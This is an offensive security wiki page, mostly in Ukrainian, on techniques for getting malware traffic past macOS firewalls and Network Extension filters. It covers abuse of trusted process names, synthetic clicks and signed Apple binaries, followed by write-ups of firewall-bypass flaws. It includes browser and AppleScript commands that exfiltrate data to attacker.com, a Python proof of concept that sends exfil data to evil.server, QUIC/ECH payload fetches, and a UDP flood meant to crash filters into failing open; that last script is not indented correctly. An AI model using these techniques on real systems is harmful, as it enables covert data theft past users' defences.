# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Знайдені техніки

Наступні техніки були знайдені працездатними в деяких macOS firewall apps.

### Зловживання whitelist names

- Наприклад виклик malware з іменами відомих macOS процесів, таких як **`launchd`**

### Synthetic Click

- Якщо firewall запитує дозволу у користувача, змусьте malware **натиснути allow**

### **Використовуйте Apple signed binaries**

- Наприклад **`curl`**, але також інші, як **`whois`**

### Відомі apple domains

Firewall може дозволяти з'єднання до відомих apple доменів, таких як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.

### Generic Bypass

Деякі ідеї, щоб спробувати обійти firewall

### Check allowed traffic

Знання дозволеного трафіку допоможе вам ідентифікувати потенційно whitelisted domains або які додатки дозволені для доступу до них
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

DNS-резолюції виконуються через підписаний додаток **`mdnsreponder`**, якому, ймовірно, буде дозволено звертатися до DNS-серверів.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Через браузерні додатки

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Якщо ви можете **inject code into a process**, який має дозволи підключатися до будь-якого сервера, ви можете обійти захист брандмауера:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
У липні 2024 року Apple виправила критичну помилку в Safari/WebKit, яка порушувала системний “Web content filter”, що використовується батьківськими контролями Screen Time.
Спеціально сформований URI (наприклад, з подвійним URL-кодуванням “://”) не розпізнається Screen Time ACL, але приймається WebKit, тому запит відправляється без фільтрації. Будь-який процес, що може відкрити URL (включно з sandboxed або unsigned кодом), таким чином може дістатися до доменів, явно заблокованих користувачем або MDM профілем.

Практичний тест (система без патча):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) проблема з порядком правил у ранніх macOS 14 “Sonoma”
Під час бета-циклу macOS 14 Apple внесла регресію в userspace-обгортку навколо **`pfctl`**.
Правила, додані з ключовим словом `quick` (яке використовують багато VPN kill-switches), тихо ігнорувалися, спричиняючи traffic leaks навіть коли VPN/firewall GUI показував *blocked*. Помилку підтвердили кілька VPN-вендорів і виправили в RC 2 (build 23A344).

Швидка leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Зловживання підписаними Apple допоміжними службами (legacy – pre-macOS 11.2)
До macOS 11.2 **`ContentFilterExclusionList`** дозволяв приблизно 50 бінарів Apple, таких як **`nsurlsessiond`** та App Store, обходити всі socket-filter брандмауери, реалізовані через Network Extension framework (LuLu, Little Snitch тощо).
Malware міг просто запустити виключений процес — або інжектувати в нього код — і тунелювати свій трафік через вже дозволений сокет. Apple повністю видалила список виключень у macOS 11.2, але ця техніка все ще актуальна на системах, які не можуть бути оновлені.

Приклад proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH щоб обійти фільтри доменів Network Extension (macOS 12+)
NEFilter Packet/Data Providers орієнтуються на TLS ClientHello SNI/ALPN. При використанні **HTTP/3 over QUIC (UDP/443)** та **Encrypted Client Hello (ECH)** SNI залишається зашифрованим, NetExt не може розпарсити трафік, а правила hostname часто fail-open, що дозволяє malware потрапляти на заблоковані домени без звернення до DNS.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Якщо QUIC/ECH все ще увімкнено, це простий шлях обходу hostname-filter.

### macOS 15 “Sequoia” Network Extension нестабільність (2024–2025)
Ранні збірки 15.0/15.1 крашать third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne тощо). Коли фільтр перезапускається, macOS видаляє свої flow rules і багато продуктів переходять у fail-open. Затоплення фільтра тисячами коротких UDP flows (або примусове використання QUIC/ECH) може багаторазово викликати краш і залишити вікно для C2/exfil, поки GUI все ще стверджує, що firewall працює.

Швидке відтворення (безпечна лабораторна машина):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Поради щодо інструментів для сучасного macOS

1. Перегляньте поточні правила PF, які генеруються GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Перелічіть бінарні файли, які вже мають *outgoing-network* entitlement (корисно для piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Програмно зареєструйте власний Network Extension content filter у Objective-C/Swift.
Мінімальний rootless PoC, що пересилає пакети до локального сокета, доступний у Patrick Wardle’s **LuLu** source code.

## Джерела

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
